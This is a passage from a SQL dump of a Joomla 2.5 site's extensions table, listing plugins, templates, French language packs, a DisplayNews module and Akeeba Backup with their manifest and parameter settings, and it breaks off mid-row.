(410, 'plg_editors_codemirror', 'plugin', 'codemirror', 'editors', 0, 1, 1, 1, '{"legacy":false,"name":"plg_editors_codemirror","type":"plugin","creationDate":"28 March 2011","author":"Marijn Haverbeke","copyright":"","authorEmail":"N\\/A","authorUrl":"","version":"1.0","description":"PLG_CODEMIRROR_XML_DESCRIPTION","group":""}', '{"linenumbers":"0","tabmode":"indent"}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(411, 'plg_editors_none', 'plugin', 'none', 'editors', 0, 1, 1, 1, '{"legacy":false,"name":"plg_editors_none","type":"plugin","creationDate":"August 2004","author":"Unknown","copyright":"","authorEmail":"N\\/A","authorUrl":"","version":"2.5.0","description":"PLG_NONE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 2, 0),
(412, 'plg_editors_tinymce', 'plugin', 'tinymce', 'editors', 0, 1, 1, 1, '{"legacy":false,"name":"plg_editors_tinymce","type":"plugin","creationDate":"2005-2013","author":"Moxiecode Systems AB","copyright":"Moxiecode Systems AB","authorEmail":"N\\/A","authorUrl":"tinymce.moxiecode.com\\/","version":"3.5.4.1","description":"PLG_TINY_XML_DESCRIPTION","group":""}', '{"mode":"1","skin":"0","compressed":"0","cleanup_startup":"0","cleanup_save":"2","entity_encoding":"raw","lang_mode":"0","lang_code":"en","text_direction":"ltr","content_css":"1","content_css_custom":"","relative_urls":"1","newlines":"0","invalid_elements":"script,applet,iframe","extended_elements":"","toolbar":"top","toolbar_align":"left","html_height":"550","html_width":"750","element_path":"1","fonts":"1","paste":"1","searchreplace":"1","insertdate":"1","format_date":"%Y-%m-%d","inserttime":"1","format_time":"%H:%M:%S","colors":"1","table":"1","smilies":"1","media":"1","hr":"1","directionality":"1","fullscreen":"1","style":"1","layer":"1","xhtmlxtras":"1","visualchars":"1","nonbreaking":"1","template":"1","blockquote":"1","wordcount":"1","advimage":"1","advlink":"1","autosave":"1","contextmenu":"1","inlinepopups":"1","safari":"0","custom_plugin":"","custom_button":""}', '', '', 0, '0000-00-00 00:00:00', 3, 0),
(413, 'plg_editors-xtd_article', 'plugin', 'article', 'editors-xtd', 0, 1, 1, 1, '{"legacy":false,"name":"plg_editors-xtd_article","type":"plugin","creationDate":"October 2009","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_ARTICLE_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(414, 'plg_editors-xtd_image', 'plugin', 'image', 'editors-xtd', 0, 1, 1, 0, '{"legacy":false,"name":"plg_editors-xtd_image","type":"plugin","creationDate":"August 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_IMAGE_XML_DESCRIPTION","group":""}', '{}', '', '', 390, '2012-12-16 22:42:19', 2, 0),
(415, 'plg_editors-xtd_pagebreak', 'plugin', 'pagebreak', 'editors-xtd', 0, 1, 1, 0, '{"legacy":false,"name":"plg_editors-xtd_pagebreak","type":"plugin","creationDate":"August 2004","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_EDITORSXTD_PAGEBREAK_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 3, 0),
(416, 'plg_editors-xtd_readmore', 'plugin', 'readmore', 'editors-xtd', 0, 1, 1, 0, '{"legacy":false,"name":"plg_editors-xtd_readmore","type":"plugin","creationDate":"March 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_READMORE_XML_DESCRIPTION","group":""}', '{}', '', '', 390, '2012-10-22 22:42:45', 4, 0),
(417, 'plg_search_categories', 'plugin', 'categories', 'search', 0, 1, 1, 0, '{"legacy":false,"name":"plg_search_categories","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_SEARCH_CATEGORIES_XML_DESCRIPTION","group":""}', '{"search_limit":"50","search_content":"1","search_archived":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(418, 'plg_search_contacts', 'plugin', 'contacts', 'search', 0, 1, 1, 0, '{"legacy":false,"name":"plg_search_contacts","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_SEARCH_CONTACTS_XML_DESCRIPTION","group":""}', '{"search_limit":"50","search_content":"1","search_archived":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(419, 'plg_search_content', 'plugin', 'content', 'search', 0, 1, 1, 0, '{"legacy":false,"name":"plg_search_content","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_SEARCH_CONTENT_XML_DESCRIPTION","group":""}', '{"search_limit":"50","search_content":"1","search_archived":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(420, 'plg_search_newsfeeds', 'plugin', 'newsfeeds', 'search', 0, 1, 1, 0, '{"legacy":false,"name":"plg_search_newsfeeds","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_SEARCH_NEWSFEEDS_XML_DESCRIPTION","group":""}', '{"search_limit":"50","search_content":"1","search_archived":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(421, 'plg_search_weblinks', 'plugin', 'weblinks', 'search', 0, 1, 1, 0, '{"legacy":false,"name":"plg_search_weblinks","type":"plugin","creationDate":"November 2005","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_SEARCH_WEBLINKS_XML_DESCRIPTION","group":""}', '{"search_limit":"50","search_content":"1","search_archived":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(422, 'plg_system_languagefilter', 'plugin', 'languagefilter', 'system', 0, 0, 1, 1, '{"legacy":false,"name":"plg_system_languagefilter","type":"plugin","creationDate":"July 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_SYSTEM_LANGUAGEFILTER_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(423, 'plg_system_p3p', 'plugin', 'p3p', 'system', 0, 1, 1, 1, '{"legacy":false,"name":"plg_system_p3p","type":"plugin","creationDate":"September 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_P3P_XML_DESCRIPTION","group":""}', '{"headers":"NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"}', '', '', 0, '0000-00-00 00:00:00', 2, 0),
(424, 'plg_system_cache', 'plugin', 'cache', 'system', 0, 0, 1, 1, '{"legacy":false,"name":"plg_system_cache","type":"plugin","creationDate":"February 2007","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_CACHE_XML_DESCRIPTION","group":""}', '{"browsercache":"0","cachetime":"15"}', '', '', 0, '0000-00-00 00:00:00', 9, 0),
(425, 'plg_system_debug', 'plugin', 'debug', 'system', 0, 1, 1, 0, '{"legacy":false,"name":"plg_system_debug","type":"plugin","creationDate":"December 2006","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_DEBUG_XML_DESCRIPTION","group":""}', '{"profile":"1","queries":"1","memory":"1","language_files":"1","language_strings":"1","strip-first":"1","strip-prefix":"","strip-suffix":""}', '', '', 0, '0000-00-00 00:00:00', 4, 0),
(426, 'plg_system_log', 'plugin', 'log', 'system', 0, 1, 1, 1, '{"legacy":false,"name":"plg_system_log","type":"plugin","creationDate":"April 2007","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_LOG_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 5, 0),
(427, 'plg_system_redirect', 'plugin', 'redirect', 'system', 0, 1, 1, 1, '{"legacy":false,"name":"plg_system_redirect","type":"plugin","creationDate":"April 2009","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_REDIRECT_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 6, 0),
(428, 'plg_system_remember', 'plugin', 'remember', 'system', 0, 1, 1, 1, '{"legacy":false,"name":"plg_system_remember","type":"plugin","creationDate":"April 2007","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_REMEMBER_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 7, 0),
(429, 'plg_system_sef', 'plugin', 'sef', 'system', 0, 1, 1, 0, '{"legacy":false,"name":"plg_system_sef","type":"plugin","creationDate":"December 2007","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_SEF_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 8, 0),
(430, 'plg_system_logout', 'plugin', 'logout', 'system', 0, 1, 1, 1, '{"legacy":false,"name":"plg_system_logout","type":"plugin","creationDate":"April 2009","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_SYSTEM_LOGOUT_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 3, 0),
(431, 'plg_user_contactcreator', 'plugin', 'contactcreator', 'user', 0, 0, 1, 1, '{"legacy":false,"name":"plg_user_contactcreator","type":"plugin","creationDate":"August 2009","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_CONTACTCREATOR_XML_DESCRIPTION","group":""}', '{"autowebpage":"","category":"34","autopublish":"0"}', '', '', 0, '0000-00-00 00:00:00', 1, 0);
INSERT INTO `jos_extensions` (`extension_id`, `name`, `type`, `element`, `folder`, `client_id`, `enabled`, `access`, `protected`, `manifest_cache`, `params`, `custom_data`, `system_data`, `checked_out`, `checked_out_time`, `ordering`, `state`) VALUES
(432, 'plg_user_joomla', 'plugin', 'joomla', 'user', 0, 1, 1, 0, '{"legacy":false,"name":"plg_user_joomla","type":"plugin","creationDate":"December 2006","author":"Joomla! Project","copyright":"(C) 2005 - 2009 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_USER_JOOMLA_XML_DESCRIPTION","group":""}', '{"autoregister":"1"}', '', '', 0, '0000-00-00 00:00:00', 2, 0),
(433, 'plg_user_profile', 'plugin', 'profile', 'user', 0, 0, 1, 1, '{"legacy":false,"name":"plg_user_profile","type":"plugin","creationDate":"January 2008","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_USER_PROFILE_XML_DESCRIPTION","group":""}', '{"register-require_address1":"1","register-require_address2":"1","register-require_city":"1","register-require_region":"1","register-require_country":"1","register-require_postal_code":"1","register-require_phone":"1","register-require_website":"1","register-require_favoritebook":"1","register-require_aboutme":"1","register-require_tos":"1","register-require_dob":"1","profile-require_address1":"1","profile-require_address2":"1","profile-require_city":"1","profile-require_region":"1","profile-require_country":"1","profile-require_postal_code":"1","profile-require_phone":"1","profile-require_website":"1","profile-require_favoritebook":"1","profile-require_aboutme":"1","profile-require_tos":"1","profile-require_dob":"1"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(434, 'plg_extension_joomla', 'plugin', 'joomla', 'extension', 0, 1, 1, 1, '{"legacy":false,"name":"plg_extension_joomla","type":"plugin","creationDate":"May 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_EXTENSION_JOOMLA_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 1, 0),
(435, 'plg_content_joomla', 'plugin', 'joomla', 'content', 0, 1, 1, 0, '{"legacy":false,"name":"plg_content_joomla","type":"plugin","creationDate":"November 2010","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"PLG_CONTENT_JOOMLA_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(500, 'atomic', 'template', 'atomic', '', 0, 1, 1, 0, '{"legacy":false,"name":"atomic","type":"template","creationDate":"10\\/10\\/09","author":"Ron Severdia","copyright":"Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.","authorEmail":"contact@kontentdesign.com","authorUrl":"http:\\/\\/www.kontentdesign.com","version":"2.5.0","description":"TPL_ATOMIC_XML_DESCRIPTION","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(502, 'bluestork', 'template', 'bluestork', '', 1, 1, 1, 0, '{"legacy":false,"name":"bluestork","type":"template","creationDate":"07\\/02\\/09","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.0","description":"TPL_BLUESTORK_XML_DESCRIPTION","group":""}', '{"useRoundedCorners":"1","showSiteName":"0","textBig":"0","highContrast":"0"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(503, 'beez_20', 'template', 'beez_20', '', 0, 1, 1, 0, '{"legacy":false,"name":"beez_20","type":"template","creationDate":"25 November 2009","author":"Angie Radtke","copyright":"Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.","authorEmail":"a.radtke@derauftritt.de","authorUrl":"http:\\/\\/www.der-auftritt.de","version":"2.5.0","description":"TPL_BEEZ2_XML_DESCRIPTION","group":""}', '{"wrapperSmall":"53","wrapperLarge":"72","sitetitle":"","sitedescription":"","navposition":"center","templatecolor":"nature"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(504, 'hathor', 'template', 'hathor', '', 1, 1, 1, 0, '{"legacy":false,"name":"hathor","type":"template","creationDate":"May 2010","author":"Andrea Tarr","copyright":"Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.","authorEmail":"hathor@tarrconsulting.com","authorUrl":"http:\\/\\/www.tarrconsulting.com","version":"2.5.0","description":"TPL_HATHOR_XML_DESCRIPTION","group":""}', '{"showSiteName":"0","colourChoice":"0","boldText":"0"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(505, 'beez5', 'template', 'beez5', '', 0, 1, 1, 0, '{"legacy":false,"name":"beez5","type":"template","creationDate":"21 May 2010","author":"Angie Radtke","copyright":"Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.","authorEmail":"a.radtke@derauftritt.de","authorUrl":"http:\\/\\/www.der-auftritt.de","version":"2.5.0","description":"TPL_BEEZ5_XML_DESCRIPTION","group":""}', '{"wrapperSmall":"53","wrapperLarge":"72","sitetitle":"","sitedescription":"","navposition":"center","html5":"0"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(600, 'English (United Kingdom)', 'language', 'en-GB', '', 0, 1, 1, 1, '{"legacy":false,"name":"English (United Kingdom)","type":"language","creationDate":"2008-03-15","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.10","description":"en-GB site language","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(601, 'English (United Kingdom)', 'language', 'en-GB', '', 1, 1, 1, 1, '{"legacy":false,"name":"English (United Kingdom)","type":"language","creationDate":"2008-03-15","author":"Joomla! Project","copyright":"Copyright (C) 2005 - 2013 Open Source Matters. All rights reserved.","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.10","description":"en-GB administrator language","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(700, 'files_joomla', 'file', 'joomla', '', 0, 1, 1, 1, '{"legacy":false,"name":"files_joomla","type":"file","creationDate":"November 2013","author":"Joomla! Project","copyright":"(C) 2005 - 2013 Open Source Matters. All rights reserved","authorEmail":"admin@joomla.org","authorUrl":"www.joomla.org","version":"2.5.16","description":"FILES_JOOMLA_XML_DESCRIPTION","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10000, 'theme777', 'template', 'theme777', '', 0, 1, 1, 0, '{"legacy":false,"name":"theme777","type":"template","creationDate":"Unknown","author":"Unknown","copyright":"","authorEmail":"","authorUrl":"","version":"1.6.0","description":"TPL_THEME777_XML_DESCRIPTION","group":""}', '{"sitetitle":"","sitedescription":"","leftcol":"270","rightcol":"270"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10001, 'Frenchfr-FR', 'language', 'fr-FR', '', 0, 1, 0, 0, '{"legacy":false,"name":"French (fr-FR)","type":"language","creationDate":"December 2013","author":"French translation team : joomla.fr","copyright":"Copyright (C) 2005 - 2013 joomla.fr et Open Source Matters. Tous droits r\\u00e9serv\\u00e9s","authorEmail":"traduction@joomla.fr","authorUrl":"www.joomla.fr","version":"2.5.17.1","description":"fr-FR site language","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10002, 'Frenchfr-FR', 'language', 'fr-FR', '', 1, 1, 0, 0, '{"legacy":false,"name":"French (fr-FR)","type":"language","creationDate":"19 mar 2013","author":"French translation team : joomla.fr","copyright":"Copyright (C) 2005 - 2013 joomla.fr et Open Source Matters. Tous droits r\\u00e9serv\\u00e9s","authorEmail":"traduction@joomla.fr","authorUrl":"www.joomla.fr","version":"2.5.17.1","description":"fr-FR administrator language","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10003, 'TinyMCE langue FR', 'file', 'TinyMCE_fr-FR', '', 0, 1, 0, 0, '{"legacy":false,"name":"TinyMCE langue FR","type":"file","creationDate":"4 feb 2013","author":"French translation team : joomla.fr","copyright":"(C) 2005-2013 French Translation Team","authorEmail":"traduction@joomla.fr","authorUrl":"www.joomla.fr","version":"3.5.4.1","description":"\\t\\t\\n\\t\\t<h3>Installation du pack de langue FR de TinyMCE 3.5.4.1 pour Joomla 2.5 effectu\\u00e9e avec succ\\u00e8s<\\/h3>\\n \\u00a0 \\u00a0 \\u00a0 \\u00a0<div style=\\"font-weight:normal\\">\\n \\t\\tN''oubliez pas de s\\u00e9lectionner la langue FR dans la \\n \\t\\t<a href=\\"index.php?option=com_plugins&view=plugins&filter_search=TinyMCE\\"><strong>gestion du plug-in TinyMCE<\\/strong><\\/a><br \\/>\\n \\t\\tSi vous utilisez la d\\u00e9tection automatique, veillez \\u00e0 ce que soient install\\u00e9s les diff\\u00e9rents packs de langue de TinyMCE correspondants \\n \\t\\t\\u00e0 ceux install\\u00e9s pour Joomla!<\\/div>\\t\\t\\n\\t\\t\\n\\t","group":""}', '', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10004, 'fr-FR', 'package', 'pkg_fr-FR', '', 0, 1, 1, 0, '{"legacy":false,"name":"French Language Pack","type":"package","creationDate":"December 2013","author":"French translation team : joomla.fr","copyright":"Copyright (C) 2005 - 2013 joomla.fr et Open Source Matters. Tous droits r\\u00e9serv\\u00e9s","authorEmail":"traduction@joomla.fr","authorUrl":"www.joomla.fr","version":"2.5.17.1","description":"\\n\\t\\t\\n\\t\\t<h3>Joomla! Full French (fr-FR) Language Package version 2.5.17v1<\\/h3>\\n\\t\\t<h3>Paquet de langue fran\\u00e7ais complet Joomla! fr-FR version 2.5.17v1<\\/h3>\\n\\t\\t<div>Installation incluse du pack de langue fr-FR de TinyMCE 3.5.4 pour Joomla 2.5.17<\\/div><br>\\n\\t\\t<div style=\\"font-weight: normal; padding-bottom:15px;\\">N''oubliez pas de s\\u00e9lectionner la langue FR dans les <a href=\\"index.php?option=com_plugins&amp;view=plugins&amp;filter_search=TinyMCE\\"><strong>param\\u00e8tres du plug-in ''\\u00c9diteur - TinyMCE''<\\/strong><\\/a> (param\\u00e8tre  ''Langue de l''\\u00e9diteur'' = fr).<br>\\n \\t\\tSi vous utilisez la <strong>d\\u00e9tection automatique<\\/strong>, veillez \\u00e0 ce que soient install\\u00e9s les diff\\u00e9rents packs de langue de TinyMCE correspondants aux packs de langue install\\u00e9s pour Joomla!<\\/div>\\n\\t\\t\\n\\t","group":""}', '{}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10005, 'DisplayNews', 'module', 'mod_dn', '', 0, 1, 0, 0, '{"legacy":false,"name":"DisplayNews","type":"module","creationDate":"2014-Apr-30","author":"BK","copyright":"(C) 2006 - 2013 BK. All rights reserved.","authorEmail":"bkomraz1@gmail.com","authorUrl":"http:\\/\\/joomla.rjews.net","version":"2.7","description":"DISPLAY_NEWS_BY_BK_MODULE","group":""}', '{"set_count":"5","ordering":"mostrecent","show_tooltips":"0","style":"blog","set_column":"1","moduleclass_sfx":"","minus_leading":"","avoid_shown":"0","set_date_range":"","set_date_since":"","set_date_until":"","set_category_type":"","set_category_id":"","set_article_type":"0","set_article_id":"","set_article_id_extra":"","set_state":"0","set_article_archived_id":"","set_article_archived_id_extra":"","set_author_name":"","set_auto_author":"0","set_related":"0","set_metakeys":"","show_frontpage":"y","hide_current":"0","set_access":"","if_no_articles":"0","no_articles_message":"Oops!","show_title":"","link_titles":"","text_hover_title":"","title_tag":"span class=\\"title\\"","filter_title":"0","length_limit_title":"20","truncate_ending_title":"1","truncate_ending_title_sign":"...","show_text":"1","link_text":"0","filter_text":"0","preserve_tags":"<img>","limit_text":"0","length_limit_text":"100","truncate_ending":"1","truncate_ending_sign":"...","text_hover_text":"","image":"1","link_image":"0","image_num":"","image_scale":"bestfit","image_bg":"FFFFFF","image_type":"","image_width":"","image_height":"","image_size":"","image_align":"0","image_margin":"","image_class":"0","image_class_name":"","image_default":"0","image_default_file":"","video":"","video_num":"","autoplay":"","vwidth":"","vheight":"","awidth":"","aheight":"","youtube":"","youtube_num":"","youtube_width":"","youtube_height":"","youtube_player":"","youtube_autoplay":"","youtube_loop":"","youtube_start":"","youtube_plyalist":"","youtube_controls":"","youtube_autohide":"","youtube_disablekb":"","youtube_fs":"","youtube_hd":"","youtube_modestbranding":"","youtube_cc_load_policy":"","youtube_showinfo":"","youtube_rel":"","youtube_iv_load_policy":"","youtube_theme":"","youtube_color":"","show_category":"","show_category_title":"1","link_category":"","text_hover_category":"","show_more_auto":"0","text_more":"","text_hover_more_category":"","use_modify_date":"0","show_date":"","format_date":"","show_author":"","show_readmore":"2","text_readmore":"","text_hover_readmore":"","show_vote":"","rating_txt":"","show_hits":"","show_jcomment_counter":"0","comment_template":"Comments (%s)","scroll_direction":"","scroll_speed":"1","scroll_delay":"30","scroll_mouse_ctrl":"1","scroll_height":"100","lead_space":"50","tail_space":"80","link_type":"0","link_target":"","window_width":"","window_height":"","window_menubar":"0","window_directories":"0","window_location":"0","window_resizable":"0","window_scrollbars":"0","window_status":"0","window_toolbar":"0","article_link":"0","item_id_type":"0","item_id_cat_type":"0","use_row_styles":"1","use_rows_template":"1","format":"%t <br\\/>%c%S<br\\/>%a - %d<br\\/>%b<br\\/>%p%v%i<br\\/>%m<div class=\\"item-separator\\"> <\\/div>","row_template":"($title_out!='''' ? \\"$title_out\\" : '''').  ($title_out!='''' && $style != ''blog'' && $style != ''featured'' ? \\"<br\\/>\\" : ''''). ($rate_out!='''' ? \\"$rate_out<br\\/>\\" : '''').  ($cat_out.$cat_desc_out!='''' ? \\"$cat_out$cat_desc_out\\".''<br\\/>'' : '''').  ($author_out!='''' ? \\"$author_out\\" : '''').  ($author_out!='''' && $date_out!='''' ? '' - '' : '''').  ($date_out!='''' ? \\"$date_out\\" : '''').  ($author_out.$date_out!='''' ? ''<br\\/>'' : '''').  ($before_out!='''' ? \\"$before_out<br\\/>\\" : '''').  ($img_out!='''' ? \\"$img_out\\" : '''').  ($video_out!='''' ? \\"$video_out\\" : '''').  ($text_out!='''' ? \\"$text_out\\" : '''').  ($hits_out!='''' ? \\"($hits_out)\\" : '''').  ($jcomments_out<>'''' ? \\"$jcomments_out\\" : '''').  ($readmore_out!='''' ? \\"<br\\/>$readmore_out\\" : '''').  (!$last ? ''<div class=\\"item-separator\\"> <\\/div>'' : '''')","show_empty_module":"0","show_title_auto":"0","mod_title_format":"<h3>%c<\\/h3>","use_module_template":"1","module_format":"%t %c %s %r %f %m","module_template":"($mod_title_out != '''' ? \\"$mod_title_out\\" : ''''). $mod_cat_out. $scroll_start. $rows_out. $scroll_finish. ($mod_automore_out != '''' ? $mod_automore_out :'''' )","on_prepare_content_plugins":"1","before_display_content_plugins":"0","force_builtin_rating":"0","jcomments":"0","cache":"1","cache_time":"900"}', '', '', 0, '0000-00-00 00:00:00', 0, 0),
(10006, 'akeeba', 'component', 'com_akeeba', '', 1, 1, 0, 0, '{"legacy":false,"name":"Akeeba","type":"component","creationDate":"2012-10-20","author":"Nicholas K. Dionysopoulos","copyright":"Copyright (c)2006-2012 Nicholas K. Dionysopoulos","authorEmail":"nicholas@dionysopoulos.me","authorUrl":"http:\\/\\/www.akeebabackup.com","version":"3.6.8","description":"Akeeba Backup Core - Full Joomla! site backup solution, Core Edition.","group":""}', '{"siteurl":"https:\\/\\/www.lyceemaximiliensorre.fr\\/","jlibrariesdir":"\\/homez.547\\/maximilik\\/www\\/libraries","jversion":"1.6","lastversion":"3.6.8","minstability":"stable","liveupdate":"lastcheck=1350749039\\nupdatedata=\\"\\"{\\"supported\\":true,\\"stuck\\":false,\\"version\\":\\"3.6.8\\",\\"date\\":\\"2012-10-20\\",\\"stability\\":\\"stable\\",\\"downloadURL\\":\\"http:\\\\\\/\\\\\\/joomlacode.org\\\\\\/gf\\\\\\/download\\\\\\/frsrelease\\\\\\/17655\\\\\\/76965\\\\\\/com_akeeba-3.6.8-core.zip\\",\\"infoURL\\":\\"https:\\\\\\/\\\\\\/www.akeebabackup.com\\\\\\/downloads\\\\\\/akeeba-backup\\\\\\/akeeba-backup-3-6-8.html\\",\\"releasenotes\\":\\"<h3>Changelog<\\\\\\/h3><p># [LOW] Sometimes the interface renders strangely (e.g. when a plugin sets format=\\\\\\"\\\\\\")<\\\\\\/p>\\"}\\"\\"\\nstuck=0\\n\\n[update]\\nstuck=0\\nlastcheck=1365177570\\nupdatedata=\\"\\"{\\\\\\"supported\\\\\\":true,\\\\\\"stuck\\\\\\":false,\\\\\\"version\\\\\\":\\\\\\"3.7.4\\\\\\",\\\\\\"date\\\\\\":\\\\\\"2013-03-15\\\\\\",\\\\\\"stability\\\\\\":\\\\\\"stable\\\\\\",\\\\\\"downloadURL\\\\\\":\\\\\\"http:\\\\\\\\\\\\\\/\\\\\\\\\\\\\\/cdn.akeebabackup.com\\\\\\\\\\\\\\/downloads\\\\\\\\\\\\\\/akeebabackup\\\\\\\\\\\\\\/3.7.4\\\\\\\\\\\\\\/com_akeeba-3.7.4-core.zip\\\\\\",\\\\\\"infoURL\\\\\\":\\\\\\"https:\\\\\\\\\\\\\\/\\\\\\\\\\\\\\/www.akeebabackup.com\\\\\\\\\\\\\\/downloads\\\\\\\\\\\\\\/akeeba-backup\\\\\\\\\\\\\\/3-7-4.html\\\\\\",\\\\\\"releasenotes\\\\\\":\\\\\\"<h3>General information<\\\\\\\\\\\\\\/h3><p> This version introduces a brand new installation script called ANGIE. It departs from the aging Akeeba Backup Installer architecture and uses modern web technologies, like a purpose-built MVC framework and Bootstrap for its presentation layer. It includes some neat new features, like a semi-automated way to work around unwriteable session save directories, FTP directory browser to make enabling the FTP layer easier, better feedback on the PHP and Joomla! versions used in the site which was backed up and the current server and so on. It''s also possible to write custom templates for it, a feature requested by developers who wanted to use Akeeba Backup to create custom Joomla! distributions for their clients.<\\\\\\\\\\\\\\/p><p> If you have a problem after or before installing the component please read our <a 